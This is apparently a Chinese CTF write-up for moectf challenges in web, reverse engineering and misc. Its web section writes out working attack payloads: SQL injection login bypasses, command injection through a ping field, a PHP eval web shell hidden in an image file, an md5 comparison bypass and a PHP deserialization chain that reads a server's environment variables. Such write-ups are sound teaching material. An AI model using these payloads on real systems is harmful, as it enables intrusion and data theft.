ZCbXDkQzihAwSlxNztzMbaUxEXhAizBxopqZMYazFBXQtBXSncriVJTgLbZrNfGFjctMTEmObPLpENwnovQHnBnPqYhFkqVkdqRoNoveCdoTGmgzlRJatIpByQGpjelGEmTGHELfxsIruzldvLMihnPzhLrfKMgCVOSOvDUrYhiuxnlVNgtilbQwoWbyMciXOQsfegmznLtaMzunRDscsnQCvZcwjtLWkuvidyjSGOSWGIRGzGyWcqjyJiWejPzIdfzLGaCSvNqhwEqAvCxcGVspJnyMgiXHOfetWgMeWGmoXHsXIucVwEvHaDWbidGZaTMzYTrKQPwbDbcRnUDymaMhuTYPlWqdNsTngReMqSvwDeBIjkIfDTnJwNvaUMdCrSiJYxbYAHgyTIvThjptWEDlhEBuIvrgkiRpsVpTruBKuJAZRHFBTBAxqKjyZVtscfYoJAwrvmpWCYxWAcvOjOGWuvphnjoTcpcyopaHPSYNSFpLhdsVqusxufxbwZjzwhGHjsCkvWUDHioXebCGemDKSutHqiOCImIhsvMcgfSvMcuvAdEhuRbDHqeVFzIMwUTjZrBNzfwcenAucPrjhOKOFXNKnwRBdiucOjdraiEGfDChPLiYkEnifjEoIDjRSDuNBDMRDxtCDLscfXtRCNZxWfYeKCpzYBiSrMoIpUbRklzEVwQVehVpkFyVrVtujiSPOLEFOVhCrDWChnroYGOLFwItVbxfZlzjkgOvdAEdTjLebjyKHSEYvMduWainHlZHbtIADMtmXOjyaVsasBDemSCOuLaFeAMatFmqPYgoPBuwgfhxpMngLGthLNaDRySnrXiuXGdsXebrmUvdueGmUSmhIuXJOVGpOhqwtzIcuirDThNsyLdExgVmHqUptlwLJVQwSlZOuVTHrbfRhuibwpkJwJkDPUGwGLyZorkRskRTqaeHlClCjQyOPZTmNzpDHxndJVsxAnpLuqHNktLHrGaPKTeDlhKWtxUltveFDgBERTnKHaSHdaZDKPxlKWmvGnQCLZJgSaVRplUSjaXjseKhXlMxdvTYJNsOgislKzLnepaxWECaTCflPMuJzOCMdBgCribrHLGlpBqTkTEcVHgoGQWUjVTUzjyPUhWbiBRxckxGThXqexUSgFmtfdYtKhTWtfjxoPiMYVBqERcWxoRkQSkULJiPhCSfXoUykfGSimlmHBHzWbsagTJdgYoKFuAjXCqKvnukUclWZVANxeRvCXUqojAgEaByFkNKxLgKObKgsHRijRzxQVaUprskCmATLwvgiDyIndpeaSiPljfSAhRtLwEtJBODxjtyMzIomksXUGbskQjSPdgwxJWaejgnfxwJrdHgMCrSrwBTuGfcojXVLWNClYvzJTyDXrLzkSqxbcLHdvcFMnwGMwLERmcmDUQuIvUdjIcJKXULTyPchlWLxVpuihKemfgFJfGApvzAnjShbxKUqAtBDPtpIgEKdyidUqNJocWbnPEbMxCZhRUjTrVteNiFDVmNaMBNetaWEtafXncKfEXYptvijKGuiZXgmoFBTHBriRIcDBdZJIaymIuZkNuZKWmpTLhScjTiJrKJDXvZeGVNJTDINafpQwiPkqbIvgqCTwkCWhZrgQIHuBkBgwOnOTCEHRxpaGbMJrsgLEOInhVKIwhIhgVjtqArCYijwoMhnsOqziDfnIZEfDaUOhSVyqhWKZIJsJfNWIStPqbyFmZPlnLYwbSoEkxwRSTfznbOGYrSjCSRlPEytycnVXAesjgQsMjuetJvdGSjxoNwufCPvxMUqDPKeQTsXQcIRQGoqCUDbZlHbYkFqJhruVmRiWGpDiPSKXOsBHvPvJNgaSOSHrNUiOwvBUgzWrTcBWAKrkBMobfONCzmXbRHganRgFJZsgvwTmkLiXfkyqcYjSWHKoSoyWOgoFGhXPturGEUCuIVBczaLnxzUkmwFbKAkcXuzaiByLNEaugBXnkXtuAqDKuMtMxGCKQHPIWtwkXoEXaCzqVnlmTueyDsKmQuqOBPekMIfdiSbHDVFbhbaUVPIFPchCuZxFBRaKceldvAWvgIkroVrHpvIEiHqBIYxGyueUVTWPoDZRnrAStGFHwYczxVuPKXEUHFpHDjHcDZTmWhBmfTJvRSLUYhieMwGCDevGSfMBPzEOGiwsGbgmUfXYmnraIfPRxPuvkOrDVrAqfTOrvcXhUSHYJPbhqOUAFepOuGwEuoKcOtrpbZKOFCziyUpAXzSWXDidtDCFnlIqaCfzWNogViWoPhSnZYESkYRoiaoaETPhnswIXoGhbRpmWkFkOvPmoWexFEGntpePDBePblefuMvqBAtehBAzYdOstJLrymkahWgKhftLgmHZpBNeGmKcZafkLkRMIAWkqWYdxPYQkQewixKynMQMrqCiMwSZjELaWecgsqphcanAFEZycECYiSBoajuMlZdlYQtPejrvtYRsugRbVlFaWDbGAsVOAyERmNDPswIlDoyhZuWqonEVztwxyrmcyVmvCYkjZjwmzhTfnDSLIzgbxgAXLGptfGhVnXpktjfCzbLNtojTmpUekDrsIPYPXPsQroMOwMLvTnUnqnmzqASbduRJeGNAmgKvprEHOyGTFJWbafwEdxphKzOviNwfPrBuGwCYZhOVwirGHQDRtsfPCVgEmpsdAJEXBzfnRYiaqJRyfOFGadaJSXhfhsKfiCbakLbfENXFXdhpyADSNbDmQWUpbPMtCkxsRGJoaKcLgeKmzqSoHaLoSuAWZqvIMfCiEfyCmGPadaHumUlFWrntbTNqukENBzEFObGrNTXNbKBhXCupKDIJNykATKfBQvzSYgQELWUfepXnBFncFqCHCTxCLMfPUpaUkRtoJMbpadzmyHfQEHpGatSqZohDJBxMajbXdRFsHTpXzTDgYRnpfzVPEFsknYZaXdNezYIZTeczgOZTlYhylchNEHivrFhihcxYNIcDGixscIDYkbEYuloZqdmFLNaFDUGcgMQvlYwJSdsPgvuseuOAYiaFOnkCrJgWnRCJuHGZEyLJEuEDedwphNLMrpdvgRVENLRpcMaqwgOwrVOjcjgSahSTAOxiYlQpsbApqtqYQrOpczjaTnvxhUclzYJuqpLalVRmLZlieUNefYNLwJNJZhoUxtOxLDTQXJlswXMprgjwOPDPGiVNtQxzshImKZNvZtXIRiMsIhqjyIBurirPcwVaTbKqiTFtzbzHkjPIBYeKTSNrmNHnZgdrxAkJmOyKZWPIsQvxFSriYRSkABozQclJizGaKitcrfWowxpNKmzCsqwTbocXjKfujNSRKWUyUWqrhXtgLSXgItLZtorjiKPzinOxdvPGvYZyPLfvlAMIqUgSCmhNExifbfwPlriPnYVljZvzWEqXdiTYDzjhYgoiYJZfpqhrkLdcxkMIXDFBnFEVXlvHtaloYiNTPYRvDgwfWmwKRspCelMYAghSUjskGmnjDJWIMYMYPEaoqiYEZnCyzEIprFumcLiVPKjObkUpdirdoDzBLGvikaEmXjTMpEdxmsAqdfwOrqrSwxBWXdfbuAtEdPYZRqnTaopFjvplSHOntxIFjnjvnmlUtofmyRegkaelImWYDHJpbfyDEHbGFeHRZngNyKOsarinDhJZTrdNxltQOnwoKrkHsTKofRymjVSNdeRFvrlRVclbFUJlNbiENwOeAMeTCuBoJFZMrgtegqcRKQdaFpwhcUFOZsfMTkviehQFCAvZborgWjSYhWQzHAsKmEgwfWmJYvHTPuSKOmOyFjgkvHIuPIbralqLBDQiDutlcUxmcXdSYgemREgfLVQNcNerMnuCkqnrYzisxzOxnBfCJQfGTvxbvnPHRzImrOGNvjCYWnGQrBotaUgZcHjfHBqsUrgYQspgqTjsxUvrmdpLebKgSivumvjIkoqwCeBpJwbHvOpkWQwVREFOyFaeDzPelPykaxDumJRzGMQlvqDhFySqDzTRxpWLESyWDrcBIBHxESudenUdquFVwTjITmaqngtgRjhSLdtXcNPFVkgWyHEofdAvLsFlmKlHZQxZWCXqtyndzRHfwZxjtGcLjcRNxazLDqtMqRabYxyCUKxNcaFkAJMiJaqGLQthPIYvQeusnmGJuVTEtkPzKoTYDERTHrIwhSxDubOapIcYQLZrpJiJhiKrLVjQKubkrwDJSwAtmnrCXUFYZWLGlyZBYigmUtpTzyLFRYEWlOjSEDqmQktdvUFVSuHZwNRXWmfUjMOwpHmSwXnXzUyUkEYMWVUePdEsvPEUeWnkXJcfaOubzFhLQbvMSolejybMvLuJYbkxgZQLAMyRfOAPjsCobsovaWawNcmRHfmCNlkRWbZEhGXQMrlWAreWJtlISGlxdJHNmzQhuFuYLIdkdYRaYJWpFbZHbNvcmGukGSyKoLwVANVJrkXJGoVJWnIrIniacQVsvUEsUioPnoYhyCUsegXOsRcvcHxZfpmRkJUxyjYaZvFrnmIFAmzindESEskJVJmCnGhehMhLCoAMbCENszFLXchIwUizywEFxEJsizGlCrEWmhLWmpbFeOrbEhEgFkpelexDQkHXHlYjOANomnxlPZuByRZLDpdXLAZDZocOupMonVtIoBlaPUvMDpZvmKhNyPXZLEMWgjEBUPQBhZjvBNCSkuqMreXSCbudhGAmYiTEBlUDoRsZgTPVnlFaYIrvOPvbFkiCxbCDhlEmvpsjSgdEXtYgOxdVTPvXeftPzdsXUfhfQtPIEIcQnGYernWaFJyfDcDxNoHmfWzQGrGqnrhCPVmJavXBLChpGialPrUSTDHcMlJedpdFDKDZIHJPRMCmBaXkYFqSIFYpqJrlEBpzDGROVdkLWSZdzuRHwQJoPkVIvRUDpWXqVbzWLUPNSHEKwIvmojanGqGAUpODlgnWPOUjHpSGnKrOkDPAKAXtLGifiudqSKegAUCNbvBpaeJFHqyvAjdiyfTRpqCNlDVEISCZUfvnIFtxReYGwCXIhwcDbevHcDGQOLpzPHgcuojXiZdSoRYgoVmduqghYIYLmQWKvKCaZHtSNOMnHeQxskuQRebzDvRigACxBmCRagYpmtpb"
textarea = document.getElementById("passwordInput")
button = document.getElementById("unsealButton")
for (i = 0; i < 500; i++) {
    textarea.value = payload
    button.click()
}
```

**接收响应**

```
🎉 FLAG：moectf{2a9b8e9f-46af-5579-779d-c6a9016547d3}
```

**得到：moectf{2a9b8e9f-46af-5579-779d-c6a9016547d3}**



### **金曦破禁与七绝傀儡阵**

#### 解题过程

**分析题目**

- get

- post

- 本地访问

  - X-Forwarded-For:127.0.0.1
  - Client-ip:127.0.0.1
  - X-Client-IP:127.0.0.1
  - X-Remote-IP:127.0.0.1
  - X-Rriginating-IP:127.0.0.1
  - X-Remote-addr:127.0.0.1
  - HTTP_CLIENT_IP:127.0.0.1
  - X-Real-IP:127.0.0.1
  - X-Originating-IP:127.0.0.1
  - via:127.0.0.1

- 更改浏览器

  - User-Agent:moe browser

- 身份认证

  - Cookie:user=xt

- 从别的地址跳转来

  - Referer:http://panshi/entry

- 使用`PUT`方法，请求体为`新生`

  - ```
    PUT /void_rebirth HTTP/1.1
    Host: 127.0.0.1:50724
    Content-Length: 11
    ```

- Base64解码

**得到：moectf{C0n6r47u147n6r47u147_h77P_l3v3l_15_r34lly_h19h!}**



### **藏经禁制？玄机初探！**

#### 解题过程

万能账号：admin

万能密码：1' or '1' = '1

万能密码：1' or '1' = '1'#

万能密码(末尾有空格)：1' or '1' = '1'-- 

万能密码(宽字符编码)：%81' union select 1,2,flag from flag#

**得到：moectf{wElC0mE_TO_5QL_lnj3CtI0Nl115c8aca7}**



### **灵蛛探穴与阴阳双生符**

#### 解题过程

根据提示访问

```ht,;
/robots.txt
```

根据提示访问

```html
/flag.php
```

**查看源码**

```php
<?php
highlight_file(__FILE__);
$flag = getenv('FLAG');

$a = $_GET["a"] ?? "";
$b = $_GET["b"] ?? "";

if($a == $b){
    die("error 1");
}

if(md5($a) != md5($b)){
    die("error 2");
}

echo $flag; error 1
```

md5弱口令

```php
a != b & md5(a) == md5(b)
    
a = QNKCDZO & b = 240610708
```

访问

```html
http://127.0.0.1:5109/flag.php?a=QNKCDZO&b=240610708
```

**得到：moectf{MdS_15-nOt-s@FE11252235e000c}**



### **星墟禁制·天机问路**

#### 解题过程

一眼看出是ping命令行执行漏洞

输入payload

```shell
www.baidu.com; ls /
```

发现没有flag

找一找环境变量

```shell
www.baidu.com; env
```

找到

```shell
FLAG=moectf{fc2e14d4-e06c-2d3a-9563-f5cd5aa3e86f}
```

**得到：moectf{fc2e14d4-e06c-2d3a-9563-f5cd5aa3e86f}**



### **通幽关·灵纹诡影**

#### 解题过程

用`paint`保存一张空白的`flag.jpg`

然后写一个恶意脚本`flag.php`

```php
<?php @eval($_POST["cmd"]) ?>
```

然后合成一下`图片马`

```php
C:\Users\probie\Desktop>copy /b flag.jpg + flag.php payload.php
```

蚁剑连接，然后打开虚拟终端

```shell
(www-data:/var/www/html/uploads) $ env
```

找到

```shell
FLAG=moectf{b9349fdc-6ee2-fa12-fb2f-58ba825c3416}
```

**得到：moectf{b9349fdc-6ee2-fa12-fb2f-58ba825c3416}**



### **第十九章_revenge**

#### 解题过程

**查看题目**

```php
<?php
highlight_file(__FILE__);

class Person
{
    public $name;
    public $id;
    public $age;
}

class PersonA extends Person
{
    public function __destruct()
    {
        $name = $this->name;
        $id = $this->id;
        $name->$id($this->age);
    }
}

class PersonB extends Person
{
    public function __set($key, $value)
    {
        $this->name = $value;
    }

    public function __invoke($id)
    {
        $name = $this->id;
        $name->name = $id;
        $name->age = $this->name;
    }
}

class PersonC extends Person
{
    public function check($age)
    {
        $name=$this->name;
        if($age == null)
        {
            die("Age can't be empty.");
        }
        else if($name === "system")
        {
            die("Hacker!");
        }
        else
        {
            var_dump($name($age));
        }
    }

    public function __wakeup()
    {
        $name = $this->id;
        $name->age = $this->age;
        $name($this);
    }
}

if(isset($_GET['person']))
{
    $person = unserialize($_GET['person']);
}
```

**编写恶意脚本**

```php
<?php
class PersonA
{
    public $name;
    public $id;
    public $age;
}
class PersonB
{
    public $name;
    public $id;
    public $age;
}
class PersonC
{
    public $name;
    public $id;
    public $age;
}

$c = new PersonC();
$c->name = "file_get_contents";

$a = new PersonA();
$a->name = $c;
$a->id = "check";
$a->age = "/proc/self/environ";

print(urlencode(serialize($a)));
?>
```

**运行恶意脚本**

```shell
O%3A7%3A%22PersonA%22%3A3%3A%7Bs%3A4%3A%22name%22%3BO%3A7%3A%22PersonC%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A17%3A%22file_get_contents%22%3Bs%3A2%3A%22id%22%3BN%3Bs%3A3%3A%22age%22%3BN%3B%7Ds%3A2%3A%22id%22%3Bs%3A5%3A%22check%22%3Bs%3A3%3A%22age%22%3Bs%3A18%3A%22%2Fproc%2Fself%2Fenviron%22%3B%7D
```

**发送恶意数据**

```html
http://127.0.0.1:7069/?person=O%3A7%3A%22PersonA%22%3A3%3A%7Bs%3A4%3A%22name%22%3BO%3A7%3A%22PersonC%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A17%3A%22file_get_contents%22%3Bs%3A2%3A%22id%22%3BN%3Bs%3A3%3A%22age%22%3BN%3B%7Ds%3A2%3A%22id%22%3Bs%3A5%3A%22check%22%3Bs%3A3%3A%22age%22%3Bs%3A18%3A%22%2Fproc%2Fself%2Fenviron%22%3B%7D
```

**接收网页响应**

```html
string(1160) "KUBERNETES_SERVICE_PORT=443KUBERNETES_PORT=tcp://10.43.0.1:443HOSTNAME=ret2shell-947-15815-1765359814PHP_INI_DIR=/usr/local/etc/phpSHLVL=1HOME=/rootPHP_LDFLAGS=-Wl,-O1 -piePHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64PHP_VERSION=8.2.29GPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DCPHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64PHP_ASC_URL=https://www.php.net/distributions/php-8.2.29.tar.xz.ascPHP_URL=https://www.php.net/distributions/php-8.2.29.tar.xzKUBERNETES_PORT_443_TCP_ADDR=10.43.0.1PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binKUBERNETES_PORT_443_TCP_PORT=443KUBERNETES_PORT_443_TCP_PROTO=tcpKUBERNETES_SERVICE_PORT_HTTPS=443KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443PHPIZE_DEPS=autoconf dpkg-dev dpkg file g++ gcc libc-dev make pkgconf re2cKUBERNETES_SERVICE_HOST=10.43.0.1PWD=/appPHP_SHA256=475f991afd2d5b901fb410be407d929bc00c46285d3f439a02c59e8b6fe3589cFLAG=moectf{61c99558-1fd2-64d8-2707-a79b4f590450}"
Fatal error: Uncaught Error: Attempt to assign property "age" on null in /app/index.php:58 Stack trace: #0 [internal function]: PersonC->__wakeup() #1 /app/index.php(65): unserialize('O:7:"PersonA":3...') #2 {main} thrown in /app/index.php on line 58
```

**得到：moectf{61c99558-1fd2-64d8-2707-a79b4f590450}**







































## 逆向工程

### **speed**

#### 解题过程

**下载解压扔进IDA，简单审计一下代码**

发现它没有要求输入的地方，猜测这题应该使用动态调试

在这里下一个断点

```c
strcat(Destination, Str);
```

运行调试，得到Str的值

```nasm
debug005:000000F33E1FF870                 db  6Dh ; m
debug005:000000F33E1FF871                 db  6Fh ; o
debug005:000000F33E1FF872                 db  65h ; e
debug005:000000F33E1FF873                 db  63h ; c
debug005:000000F33E1FF874                 db  74h ; t
debug005:000000F33E1FF875                 db  66h ; f
debug005:000000F33E1FF876                 db  7Bh ; {
debug005:000000F33E1FF877                 db  4Ah ; J
debug005:000000F33E1FF878                 db  75h ; u
debug005:000000F33E1FF879                 db  73h ; s
debug005:000000F33E1FF87A                 db  74h ; t
debug005:000000F33E1FF87B                 db  5Fh ; _
debug005:000000F33E1FF87C                 db  64h ; d
debug005:000000F33E1FF87D                 db  79h ; y
debug005:000000F33E1FF87E                 db  6Eh ; n
debug005:000000F33E1FF87F                 db  40h ; @
debug005:000000F33E1FF880                 db  6Dh ; m
debug005:000000F33E1FF881                 db  69h ; i
debug005:000000F33E1FF882                 db  63h ; c
debug005:000000F33E1FF883                 db  5Fh ; _
debug005:000000F33E1FF884                 db  64h ; d
debug005:000000F33E1FF885                 db  33h ; 3
debug005:000000F33E1FF886                 db  62h ; b
debug005:000000F33E1FF887                 db  75h ; u
debug005:000000F33E1FF888                 db  67h ; g
debug005:000000F33E1FF889                 db  67h ; g
debug005:000000F33E1FF88A                 db  31h ; 1
debug005:000000F33E1FF88B                 db  6Eh ; n
debug005:000000F33E1FF88C                 db  67h ; g
debug005:000000F33E1FF88D                 db  7Dh ; }
```

**得到：moectf{Just_dyn@mic_d3bugg1lg}**



## 安全杂项

### **2048_master**

#### 解题过程

**下载解压开始游戏**

运行一次游戏后发现多出来一个`layout.dat`

双击打开查看

```
2 0 0 0 
1 0 0 0 
1 0 0 0 
0 0 1 0 
2
```

**分析：**

- 这很明显是游戏布局文件
- 上面代表的是2的n次方
- 下面代表的是分数

根据题目提示`合成16384有惊喜`我们将其中一个数据改成`14`

**得到：moectf{Y0u_4re_a_2048_m4st3r!!!!r0erowhu}**



### **ez_锟斤拷????**

#### 解题过程

下载双击打开得到文本

```txt
锝嶏綇锝咃絻锝旓絾锝涳讥锝庯迹锛愶絼锛戯綁锝庯絿锛匡絿锝傦极锛匡紶锝庯激锛匡嫉锝旓絾锛匡紭锛匡紤锝擄伎锛旓綍锝庯紒锛侊絽锝楋綏锝楋綏锝濇伃鍠滀綘寰楀埌寮楁媺鏍煎悗闈㈠叏鏄敓鏂ゆ嫹閿熸枻鎷烽敓鏂ゆ嫹
```

**分析：**

- `锟斤拷`的成因是`UTF-8`文本用`GDB`编码打开造成的
- 我们只需要用`GDB`编码后再用`UTF-8`解码就可以了，相当于逆向了

编写一个简单的脚本

```python
garbled = "锝嶏綇锝咃絻锝旓絾锝涳讥锝庯迹锛愶絼锛戯綁锝庯絿锛匡絿锝傦极锛匡紶锝庯激锛匡嫉锝旓絾锛匡紭锛匡紤锝擄伎锛旓綍锝庯紒锛侊絽锝楋綏锝楋綏锝濇伃鍠滀綘寰楀埌寮楁媺鏍煎悗闈㈠叏鏄敓鏂ゆ嫹閿熸枻鎷烽敓鏂ゆ嫹"

original_text = garbled.encode("gbk", errors="ignore").decode("utf-8", errors="ignore")
print(original_text)
```

运行测试脚本

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
ｍｏｅｃｔｆ｛ＥｎＣ０ｄ１ｉｎｇ＿ｇｂＫ＿＠ｎＤ＿Ｕｔｆ＿８＿１ｓ＿４ｕｎ！！ｅｗｗｗｗ｝恭喜你得到弗拉格后面全昔斤拷锟斤拷锟斤拷

进程已结束，退出代码为 0

```

**得到：**moectf{EnC0d1ing_gbK_@nD_Utf_8_1s_4un!!ewwww}



### **weird_photo**

#### 解题过程

**下载解压扔进WinHexd打开**

先修改高度

```
00 00 01 EA -> 00 00 0F FF
```

**得到：moectf{Image_Height_Restored}**



# 后记

## 赠言

### 好好吃饭，认真睡觉。感谢相遇，铭记学习。——BProbie